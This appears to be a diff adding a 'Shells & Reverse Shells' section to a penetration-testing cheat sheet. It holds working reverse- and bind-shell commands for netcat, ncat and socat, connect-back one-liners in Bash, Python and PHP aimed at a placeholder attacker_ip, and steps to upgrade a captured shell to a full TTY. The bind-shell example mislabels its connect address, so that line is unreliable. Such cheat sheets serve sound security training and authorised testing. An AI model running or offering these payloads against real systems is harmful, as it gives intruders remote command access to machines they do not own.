@@ -1100,3 +1100,107 @@ gobuster vhost -u http://target.com -w /usr/share/wordlists/subdomains.txt
 | | `--append-domain` | Append base domain to each wordlist word |
 | | `--domain` | Append domain to each wordlist entry |
 | `-r` | `--follow-redirect` | Follow HTTP redirects for subdomains |
+## Shells & Reverse Shells
+
+### Shell Types Comparison
+| Type | How it works | Best used when |
+|------|-------------|----------------|
+| **Reverse Shell** | Target connects back to attacker | Firewall blocks incoming connections |
+| **Bind Shell** | Target listens, attacker connects in | Attacker has direct access to target |
+| **Web Shell** | Shell accessed through web browser | Web application vulnerability found |
+
+### Netcat (nc) — Reverse Shell Setup
+
+**Attacker machine (listener):**
+```bash
+nc -lvnp 4444
+```
+- `-l` — Listen mode
+- `-v` — Verbose output
+- `-n` — No DNS resolution
+- `-p` — Port to listen on
+
+**Target machine (connect back):**
+```bash
+nc -e /bin/bash attacker_ip 4444
+```
+
+### Netcat (nc) — Bind Shell Setup
+
+**Target machine (listener):**
+```bash
+nc -lvnp 4444 -e /bin/bash
+```
+
+**Attacker machine (connect in):**
+```bash
+nc attacker_ip 4444
+```
+
+### Rlwrap — Improving Shell Quality
+```bash
+rlwrap nc -lvnp 4444
+```
+- Wraps Netcat with readline library
+- Provides command history and keyboard editing
+- Makes reverse shells more interactive
+
+### Ncat — Encrypted Listener
+```bash
+# Start encrypted listener
+ncat --ssl -lvnp 4444
+
+# Connect with SSL encryption
+ncat --ssl target_ip 4444
+```
+- Improved version of Netcat by the Nmap project
+- `--ssl` — Enables SSL encryption
+
+### Socat — Advanced Shell Setup
+```bash
+# Listener
+socat TCP-LISTEN:4444,reuseaddr EXEC:/bin/bash
+
+# Connect back
+socat TCP:attacker_ip:4444 EXEC:/bin/bash
+```
+- Creates socket connections between two data sources
+
+### Shell Payloads by Language
+
+**Bash:**
+```bash
+bash -i >& /dev/tcp/attacker_ip/4444 0>&1
+```
+
+**Python:**
+```python
+python3 -c 'import socket,subprocess,os;
+s=socket.socket();
+s.connect(("attacker_ip",4444));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+subprocess.call(["/bin/sh"])'
+```
+
+**PHP:**
+```php
+php -r '$sock=fsockopen("attacker_ip",4444);
+exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+### Upgrading a Basic Shell to Interactive
+```bash
+# Step 1 - Spawn a proper TTY
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+# Step 2 - Background the shell
+Ctrl + Z
+
+# Step 3 - Fix terminal settings
+stty raw -echo; fg
+
+# Step 4 - Set terminal type
+export TERM=xterm
+```
